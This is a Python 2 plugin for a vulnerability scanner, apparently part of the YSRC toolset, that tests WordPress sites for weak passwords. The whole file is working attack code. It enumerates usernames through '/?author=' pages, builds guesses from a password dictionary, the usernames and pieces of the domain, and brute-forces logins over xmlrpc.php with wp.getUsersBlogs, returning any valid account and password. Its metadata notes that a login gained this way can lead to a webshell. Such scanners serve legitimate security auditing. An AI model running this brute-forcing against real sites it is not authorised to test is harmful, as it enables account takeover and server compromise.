# coding:utf-8
import urllib2
import re


def get_plugin_info():
    plugin_info = {
        "name": "Wordpress弱口令",
        "info": "攻击者通过此漏洞进入后台，通过编辑功能可获取webshell，最终导致服务器被入侵控制。",
        "level": "高危",
        "type": "弱口令",
        "author": "wolf@YSRC",
        "url": "",
        "keyword": "tag:wordpress",
        "source": 1
    }
    return plugin_info


def get_user(url, timeout):
    user_list = []
    for i in range(1, 8):
        try:
            getuser_url = 'http://' + url + "/?author=" + str(i)
            res = urllib2.urlopen(getuser_url, timeout=timeout)
            res_html = res.read()
            pattern = "/author\/(.*)\/feed"
            p = "<title>(.*?)(\||-)"
            m = re.search(pattern, res_html)
            if m:
                user_list.append(m.group(1).strip())
            else:
                m1 = re.search(p, res_html)
                if m1:
                    user_list.append(m1.group(1).strip())
        except Exception, e:
            if len(user_list):
                return user_list
            else:
                return ['admin']
    if len(user_list):
        return user_list
    else:
        return ['admin']


def check(ip, port, timeout):
    url = ip + ":" + str(port)
    flag_list = ['<name>isAdmin</name>', '<name>url</name>']
    user_list = get_user(url, timeout)
    error_i = 0
    pass_list = PASSWORD_DIC
    for user_str in user_list:
        pass_list.append(user_str)
        try:
            if ':' in url:
                domain = url.split(':', 1)[0]
            else:
                domain = url
            domain_sp = domain.split('.')
            pass_list.append(domain)
            pass_list.append(domain_sp[0])
            pass_list.append(domain_sp[len(domain_sp) - 2] + "." + domain_sp[len(domain_sp) - 1])
            pass_list.append(domain_sp[len(domain_sp) - 2])
        except:
            pass
        for pass_str in pass_list:
            try:
                login_path = '/xmlrpc.php'
                PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (
                user_str, pass_str)
                request = urllib2.Request('http://' + url + login_path, PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
                for flag in flag_list:
                    if flag in res_html:
                        return u'Wordpress后台弱口令，账号：%s 密码：%s' % (user_str, pass_str)
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3: return
            except:
                return
